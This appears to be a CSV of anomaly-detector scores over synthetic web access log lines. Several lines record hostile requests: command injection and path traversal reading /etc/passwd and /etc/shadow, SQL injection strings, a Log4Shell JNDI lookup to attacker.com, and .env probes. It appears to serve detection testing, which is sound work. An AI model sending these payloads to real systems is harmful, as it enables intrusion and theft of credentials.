score_content,score_session,score_fused,score_fused_norm,line
24.327354431152344,,24.327354431152344,24.327354431152344,83.156.38.17 - - [10/Jan/2025:12:00:21 +0000] "GET /search?q=camera HTTP/1.1" 200 2747 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.983259677886963,,1.983259677886963,1.983259677886963,136.76.117.130 - - [10/Jan/2025:12:00:25 +0000] "GET /dashboard HTTP/1.1" 200 19675 "https://news.ycombinator.com/" "python-requests/2.31.0"
30141.533203125,,30141.533203125,30141.533203125,225.197.142.185 - - [10/Jan/2025:12:00:25 +0000] "GET /contact HTTP/1.1" 401 1333 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.386402130126953,,24.386402130126953,24.386402130126953,103.107.187.25 - - [10/Jan/2025:12:00:28 +0000] "GET /search?q=phone HTTP/1.1" 200 14960 "https://news.ycombinator.com/" "curl/7.68.0"
30142.767578125,,30142.767578125,30142.767578125,237.122.18.24 - - [10/Jan/2025:12:00:30 +0000] "GET /profile HTTP/1.1" 429 1406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.261383056640625,,27.261383056640625,27.261383056640625,16.151.245.144 - - [10/Jan/2025:12:00:33 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 18331 "-" "sqlmap/1.5.10#stable"
30163.966796875,,30163.966796875,30163.966796875,14.248.74.154 - - [10/Jan/2025:12:00:36 +0000] "GET /search?q=phone HTTP/1.1" 403 1476 "https://example.com/" "curl/7.68.0"
1.9941166639328003,,1.9941166639328003,1.9941166639328003,58.217.28.90 - - [10/Jan/2025:12:00:36 +0000] "GET /api/products HTTP/1.1" 200 15900 "https://example.com/" "python-requests/2.31.0"
27.338951110839844,,27.338951110839844,27.338951110839844,250.197.210.160 - - [10/Jan/2025:12:00:36 +0000] "GET /api/product?id=123 HTTP/1.1" 304 18481 "https://twitter.com/" "python-requests/2.31.0"
2.0949645042419434,,2.0949645042419434,2.0949645042419434,180.196.80.236 - - [10/Jan/2025:12:00:36 +0000] "GET /login HTTP/1.1" 200 9054 "https://example.com/" "curl/7.68.0"
0.2258128523826599,,0.2258128523826599,0.2258128523826599,18.37.190.163 - - [10/Jan/2025:12:00:36 +0000] "GET /assets/app.css HTTP/1.1" 200 13232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.352935791015625,,24.352935791015625,24.352935791015625,41.95.80.185 - - [10/Jan/2025:12:00:41 +0000] "GET /search?q=laptop HTTP/1.1" 200 11270 "https://twitter.com/" "curl/7.68.0"
0.24664154648780823,,0.24664154648780823,0.24664154648780823,173.21.70.114 - - [10/Jan/2025:12:00:45 +0000] "GET /wp-login.php HTTP/1.1" 200 1730 "https://news.ycombinator.com/" "dirb/2.22"
2.117816686630249,,2.117816686630249,2.117816686630249,30.89.111.29 - - [10/Jan/2025:12:00:49 +0000] "GET /login HTTP/1.1" 200 16888 "https://twitter.com/" "curl/7.68.0"
2.0693678855895996,,2.0693678855895996,2.0693678855895996,253.154.15.2 - - [10/Jan/2025:12:00:52 +0000] "GET /logout HTTP/1.1" 200 13051 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0787546634674072,,2.0787546634674072,2.0787546634674072,2.128.192.111 - - [10/Jan/2025:12:00:53 +0000] "GET /login HTTP/1.1" 200 4031 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.40498161315918,,24.40498161315918,24.40498161315918,19.102.221.190 - - [10/Jan/2025:12:00:56 +0000] "GET /api/product?id=123 HTTP/1.1" 200 11705 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30141.611328125,,30141.611328125,30141.611328125,110.147.104.182 - - [10/Jan/2025:12:00:56 +0000] "GET /about HTTP/1.1" 401 1179 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
11031.546875,,11031.546875,11031.546875,206.243.159.118 - - [10/Jan/2025:12:00:58 +0000] "GET /admin HTTP/1.1" 500 351 "-" "sqlmap/1.5.10#stable"
24.409461975097656,,24.409461975097656,24.409461975097656,135.21.102.223 - - [10/Jan/2025:12:01:01 +0000] "GET /api/product?id=123 HTTP/1.1" 200 13221 "https://example.com/" "curl/7.68.0"
0.22071576118469238,,0.22071576118469238,0.22071576118469238,136.131.50.232 - - [10/Jan/2025:12:01:02 +0000] "GET /assets/app.js HTTP/1.1" 200 3836 "https://example.com/" "curl/7.68.0"
0.19928210973739624,,0.19928210973739624,0.19928210973739624,66.51.45.155 - - [10/Jan/2025:12:01:07 +0000] "GET /assets/app.css HTTP/1.1" 200 4898 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.29883575439453,,24.29883575439453,24.29883575439453,195.149.115.175 - - [10/Jan/2025:12:01:08 +0000] "GET /search?q=headphones HTTP/1.1" 200 18572 "https://twitter.com/" "python-requests/2.31.0"
1.9348686933517456,,1.9348686933517456,1.9348686933517456,121.114.162.78 - - [10/Jan/2025:12:01:10 +0000] "GET /dashboard HTTP/1.1" 200 2337 "https://twitter.com/" "curl/7.68.0"
2.1125235557556152,,2.1125235557556152,2.1125235557556152,10.15.95.213 - - [10/Jan/2025:12:01:10 +0000] "GET /about HTTP/1.1" 200 14908 "-" "curl/7.68.0"
2.1153206825256348,,2.1153206825256348,2.1153206825256348,99.119.149.142 - - [10/Jan/2025:12:01:15 +0000] "GET /about HTTP/1.1" 201 16715 "-" "sqlmap/1.5.10#stable"
1.9935402870178223,,1.9935402870178223,1.9935402870178223,129.39.246.16 - - [10/Jan/2025:12:01:18 +0000] "GET /api/products HTTP/1.1" 200 15685 "-" "Wget/1.20.3 (linux-gnu)"
2.0840117931365967,,2.0840117931365967,2.0840117931365967,11.64.182.113 - - [10/Jan/2025:12:01:20 +0000] "GET /about HTTP/1.1" 200 5754 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
2.021852731704712,,2.021852731704712,2.021852731704712,100.105.199.87 - - [10/Jan/2025:12:01:24 +0000] "GET /profile HTTP/1.1" 200 9369 "https://twitter.com/" "sqlmap/1.5.10#stable"
1.9353774785995483,,1.9353774785995483,1.9353774785995483,143.174.99.73 - - [10/Jan/2025:12:01:24 +0000] "GET /dashboard HTTP/1.1" 200 3196 "https://twitter.com/" "curl/7.68.0"
30139.875,,30139.875,30139.875,248.168.179.170 - - [10/Jan/2025:12:01:25 +0000] "GET /assets/app.css HTTP/1.1" 404 635 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
2.10549259185791,,2.10549259185791,2.10549259185791,165.203.85.209 - - [10/Jan/2025:12:01:29 +0000] "GET /about HTTP/1.1" 200 12443 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.369524002075195,,24.369524002075195,24.369524002075195,93.80.47.244 - - [10/Jan/2025:12:01:29 +0000] "GET /search?q=phone HTTP/1.1" 200 697 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.21535493433475494,,0.21535493433475494,0.21535493433475494,217.202.26.130 - - [10/Jan/2025:12:01:32 +0000] "GET /assets/app.css HTTP/1.1" 200 9792 "https://twitter.com/" "python-requests/2.31.0"
0.20008473098278046,,0.20008473098278046,0.20008473098278046,42.47.213.178 - - [10/Jan/2025:12:01:32 +0000] "GET /assets/app.css HTTP/1.1" 200 5154 "https://www.google.com/" "python-requests/2.31.0"
24.364849090576172,,24.364849090576172,24.364849090576172,249.114.157.73 - - [10/Jan/2025:12:01:37 +0000] "GET /search?q=phone HTTP/1.1" 200 7883 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
11031.4775390625,,11031.4775390625,11031.4775390625,232.214.50.95 - - [10/Jan/2025:12:01:38 +0000] "GET /logout HTTP/1.1" 500 960 "https://twitter.com/" "sqlmap/1.5.10#stable"
4.994488716125488,,4.994488716125488,4.994488716125488,136.108.248.42 - - [10/Jan/2025:12:01:41 +0000] "GET /logout HTTP/1.1" 304 16579 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.3288080394268036,,0.3288080394268036,0.3288080394268036,142.240.27.183 - - [10/Jan/2025:12:01:42 +0000] "GET /index.html HTTP/1.1" 201 12263 "-" "python-requests/2.31.0"
0.10091840475797653,,0.10091840475797653,0.10091840475797653,38.213.112.24 - - [10/Jan/2025:12:01:44 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 16921 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.390666961669922,,24.390666961669922,24.390666961669922,96.61.99.21 - - [10/Jan/2025:12:01:46 +0000] "GET /search?q=phone HTTP/1.1" 200 16549 "https://www.google.com/" "curl/7.68.0"
30141.4921875,,30141.4921875,30141.4921875,86.203.38.36 - - [10/Jan/2025:12:01:46 +0000] "GET /contact HTTP/1.1" 400 1331 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.1075143814086914,,3.1075143814086914,3.1075143814086914,115.158.2.232 - - [10/Jan/2025:12:01:49 +0000] "GET /assets/app.css HTTP/1.1" 302 15471 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2371363639831543,,0.2371363639831543,0.2371363639831543,109.29.199.74 - - [10/Jan/2025:12:01:51 +0000] "GET /assets/app.css HTTP/1.1" 200 17394 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8548012971878052,,1.8548012971878052,1.8548012971878052,17.29.215.232 - - [10/Jan/2025:12:01:51 +0000] "GET /server-status HTTP/1.1" 201 15078 "https://twitter.com/" "nikto/2.5.0"
27.09412384033203,,27.09412384033203,27.09412384033203,110.1.158.91 - - [10/Jan/2025:12:01:55 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 9644 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
2.10392165184021,,2.10392165184021,2.10392165184021,18.245.135.140 - - [10/Jan/2025:12:01:58 +0000] "GET /about HTTP/1.1" 200 11916 "https://twitter.com/" "python-requests/2.31.0"
24.584617614746094,,24.584617614746094,24.584617614746094,252.96.65.192 - - [10/Jan/2025:12:02:02 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 12777 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.942371368408203,,4.942371368408203,4.942371368408203,35.12.91.140 - - [10/Jan/2025:12:02:02 +0000] "GET /contact HTTP/1.1" 304 10995 "https://www.google.com/" "curl/7.68.0"
24.254819869995117,,24.254819869995117,24.254819869995117,17.184.199.242 - - [10/Jan/2025:12:02:07 +0000] "GET /search?q=headphones HTTP/1.1" 201 4518 "-" "Wget/1.20.3 (linux-gnu)"
30141.5859375,,30141.5859375,30141.5859375,239.80.132.102 - - [10/Jan/2025:12:02:09 +0000] "GET /api/products HTTP/1.1" 403 646 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.187458038330078,,24.187458038330078,24.187458038330078,222.168.85.70 - - [10/Jan/2025:12:02:11 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 1666 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30163.955078125,,30163.955078125,30163.955078125,87.250.48.128 - - [10/Jan/2025:12:02:14 +0000] "GET /search?q=camera HTTP/1.1" 403 791 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
5.025406837463379,,5.025406837463379,5.025406837463379,21.111.155.211 - - [10/Jan/2025:12:02:16 +0000] "GET /login HTTP/1.1" 304 14010 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.097325325012207,,2.097325325012207,2.097325325012207,79.115.155.184 - - [10/Jan/2025:12:02:18 +0000] "GET /about HTTP/1.1" 200 9787 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
24.354097366333008,,24.354097366333008,24.354097366333008,158.112.71.164 - - [10/Jan/2025:12:02:23 +0000] "GET /search?q=camera HTTP/1.1" 200 11652 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.008540153503418,,2.008540153503418,2.008540153503418,244.8.37.218 - - [10/Jan/2025:12:02:28 +0000] "GET /profile HTTP/1.1" 200 5342 "https://news.ycombinator.com/" "python-requests/2.31.0"
27.141681671142578,,27.141681671142578,27.141681671142578,93.99.244.146 - - [10/Jan/2025:12:02:28 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 12103 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0021917819976807,,2.0021917819976807,2.0021917819976807,147.36.136.94 - - [10/Jan/2025:12:02:29 +0000] "GET /profile HTTP/1.1" 200 2619 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
2.011342763900757,,2.011342763900757,2.011342763900757,128.133.100.234 - - [10/Jan/2025:12:02:34 +0000] "GET /contact HTTP/1.1" 200 6196 "-" "python-requests/2.31.0"
24.347240447998047,,24.347240447998047,24.347240447998047,178.235.126.52 - - [10/Jan/2025:12:02:36 +0000] "GET /search?q=camera HTTP/1.1" 200 9457 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11053.88671875,,11053.88671875,11053.88671875,248.217.253.82 - - [10/Jan/2025:12:02:36 +0000] "GET /search?q=camera HTTP/1.1" 503 1396 "https://example.com/" "sqlmap/1.5.10#stable"
30164.037109375,,30164.037109375,30164.037109375,183.182.238.180 - - [10/Jan/2025:12:02:41 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 403 322 "https://example.com/" "curl/7.68.0"
4.88531494140625,,4.88531494140625,4.88531494140625,203.127.7.93 - - [10/Jan/2025:12:02:45 +0000] "GET /api/products HTTP/1.1" 304 7857 "https://twitter.com/" "python-requests/2.31.0"
0.19454875588417053,,0.19454875588417053,0.19454875588417053,17.80.102.184 - - [10/Jan/2025:12:02:47 +0000] "GET /assets/app.css HTTP/1.1" 200 2925 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30163.9296875,,30163.9296875,30163.9296875,33.249.82.165 - - [10/Jan/2025:12:02:51 +0000] "GET /search?q=phone HTTP/1.1" 400 151 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0469465255737305,,2.0469465255737305,2.0469465255737305,164.151.47.197 - - [10/Jan/2025:12:02:54 +0000] "GET /profile HTTP/1.1" 200 18165 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30139.806640625,,30139.806640625,30139.806640625,40.78.43.42 - - [10/Jan/2025:12:02:58 +0000] "GET /index.html HTTP/1.1" 400 1061 "https://www.google.com/" "curl/7.68.0"
30141.5546875,,30141.5546875,30141.5546875,51.163.245.142 - - [10/Jan/2025:12:03:00 +0000] "GET /logout HTTP/1.1" 400 513 "https://www.google.com/" "curl/7.68.0"
2.0835890769958496,,2.0835890769958496,2.0835890769958496,152.242.149.40 - - [10/Jan/2025:12:03:05 +0000] "GET /about HTTP/1.1" 200 5625 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30141.4296875,,30141.4296875,30141.4296875,11.212.222.8 - - [10/Jan/2025:12:03:10 +0000] "GET /dashboard HTTP/1.1" 400 1154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.1158814430236816,,2.1158814430236816,2.1158814430236816,107.159.164.8 - - [10/Jan/2025:12:03:15 +0000] "GET /login HTTP/1.1" 204 18847 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
2.0703935623168945,,2.0703935623168945,2.0703935623168945,77.117.19.177 - - [10/Jan/2025:12:03:17 +0000] "GET /logout HTTP/1.1" 200 13406 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.376495361328125,,24.376495361328125,24.376495361328125,37.81.221.184 - - [10/Jan/2025:12:03:20 +0000] "GET /search?q=camera HTTP/1.1" 200 19979 "https://example.com/" "curl/7.68.0"
24.302156448364258,,24.302156448364258,24.302156448364258,82.62.120.32 - - [10/Jan/2025:12:03:23 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 3579 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.2748006582260132,,0.2748006582260132,0.2748006582260132,222.158.108.64 - - [10/Jan/2025:12:03:24 +0000] "GET /wp-login.php HTTP/1.1" 200 12687 "https://example.com/" "curl/7.68.0"
4.870955944061279,,4.870955944061279,4.870955944061279,132.120.128.226 - - [10/Jan/2025:12:03:28 +0000] "GET /api/products HTTP/1.1" 302 16427 "https://news.ycombinator.com/" "curl/7.68.0"
0.5296539068222046,,0.5296539068222046,0.5296539068222046,56.150.91.13 - - [10/Jan/2025:12:03:28 +0000] "GET /.env HTTP/1.1" 200 7988 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.296533584594727,,24.296533584594727,24.296533584594727,217.28.111.35 - - [10/Jan/2025:12:03:31 +0000] "GET /search?q=headphones HTTP/1.1" 200 367 "https://example.com/" "curl/7.68.0"
24.37291145324707,,24.37291145324707,24.37291145324707,50.93.142.74 - - [10/Jan/2025:12:03:34 +0000] "GET /search?q=laptop HTTP/1.1" 200 18509 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30141.568359375,,30141.568359375,30141.568359375,175.157.31.33 - - [10/Jan/2025:12:03:38 +0000] "GET /login HTTP/1.1" 400 1276 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9628809690475464,,1.9628809690475464,1.9628809690475464,194.37.51.155 - - [10/Jan/2025:12:03:40 +0000] "GET /dashboard HTTP/1.1" 200 12080 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.2697616219520569,,0.2697616219520569,0.2697616219520569,206.122.133.117 - - [10/Jan/2025:12:03:44 +0000] "GET /wp-login.php HTTP/1.1" 200 11013 "https://twitter.com/" "curl/7.68.0"
24.398418426513672,,24.398418426513672,24.398418426513672,152.87.130.213 - - [10/Jan/2025:12:03:48 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 9905 "https://twitter.com/" "nikto/2.5.0"
2.2926807403564453,,2.2926807403564453,2.2926807403564453,251.107.150.79 - - [10/Jan/2025:12:03:50 +0000] "GET / HTTP/1.1" 200 3691 "-" "sqlmap/1.5.10#stable"
27.300825119018555,,27.300825119018555,27.300825119018555,123.44.135.162 - - [10/Jan/2025:12:03:54 +0000] "GET /api/product?id=123 HTTP/1.1" 302 19220 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.199745178222656,,24.199745178222656,24.199745178222656,49.5.113.81 - - [10/Jan/2025:12:03:57 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3701 "https://www.google.com/" "dirb/2.22"
24.388017654418945,,24.388017654418945,24.388017654418945,224.218.189.187 - - [10/Jan/2025:12:04:00 +0000] "GET /search?q=phone HTTP/1.1" 200 15553 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11031.5595703125,,11031.5595703125,11031.5595703125,135.97.81.245 - - [10/Jan/2025:12:04:04 +0000] "GET /dashboard HTTP/1.1" 503 979 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.875673294067383,,4.875673294067383,4.875673294067383,157.124.50.246 - - [10/Jan/2025:12:04:08 +0000] "GET /profile HTTP/1.1" 301 8762 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.9652791023254395,,4.9652791023254395,4.9652791023254395,177.181.126.82 - - [10/Jan/2025:12:04:12 +0000] "GET /logout HTTP/1.1" 304 6892 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
2.122882127761841,,2.122882127761841,2.122882127761841,174.140.98.230 - - [10/Jan/2025:12:04:16 +0000] "GET /login HTTP/1.1" 200 18891 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
30142.88671875,,30142.88671875,30142.88671875,89.237.114.168 - - [10/Jan/2025:12:04:17 +0000] "GET /logout HTTP/1.1" 429 161 "https://news.ycombinator.com/" "curl/7.68.0"
30141.732421875,,30141.732421875,30141.732421875,70.36.28.158 - - [10/Jan/2025:12:04:18 +0000] "GET /login HTTP/1.1" 404 1425 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.377277374267578,,24.377277374267578,24.377277374267578,26.106.85.184 - - [10/Jan/2025:12:04:19 +0000] "GET /api/product?id=123 HTTP/1.1" 201 1820 "-" "Wget/1.20.3 (linux-gnu)"
11031.7685546875,,11031.7685546875,11031.7685546875,105.168.240.226 - - [10/Jan/2025:12:04:24 +0000] "GET / HTTP/1.1" 500 323 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
2.0389857292175293,,2.0389857292175293,2.0389857292175293,233.197.23.167 - - [10/Jan/2025:12:04:29 +0000] "GET /logout HTTP/1.1" 200 2038 "https://www.google.com/" "python-requests/2.31.0"
30140.005859375,,30140.005859375,30140.005859375,107.226.215.46 - - [10/Jan/2025:12:04:33 +0000] "GET /index.html HTTP/1.1" 404 358 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30141.923828125,,30141.923828125,30141.923828125,77.146.155.28 - - [10/Jan/2025:12:04:36 +0000] "GET /logout HTTP/1.1" 403 18 "https://example.com/" "curl/7.68.0"
30163.919921875,,30163.919921875,30163.919921875,218.130.120.70 - - [10/Jan/2025:12:04:39 +0000] "GET /search?q=headphones HTTP/1.1" 403 274 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.329572677612305,,24.329572677612305,24.329572677612305,4.189.87.203 - - [10/Jan/2025:12:04:41 +0000] "GET /search?q=camera HTTP/1.1" 204 6201 "https://twitter.com/" "curl/7.68.0"
0.2507060170173645,,0.2507060170173645,0.2507060170173645,212.110.132.84 - - [10/Jan/2025:12:04:46 +0000] "GET /assets/app.js HTTP/1.1" 200 13387 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.16642476618289948,,0.16642476618289948,0.16642476618289948,2.67.99.61 - - [10/Jan/2025:12:04:51 +0000] "GET /../../etc/passwd HTTP/1.1" 200 8228 "https://example.com/" "nikto/2.5.0"
2.318589925765991,,2.318589925765991,2.318589925765991,178.61.16.171 - - [10/Jan/2025:12:04:53 +0000] "GET / HTTP/1.1" 200 11881 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.915146350860596,,4.915146350860596,4.915146350860596,95.158.57.57 - - [10/Jan/2025:12:04:55 +0000] "GET /logout HTTP/1.1" 301 9767 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
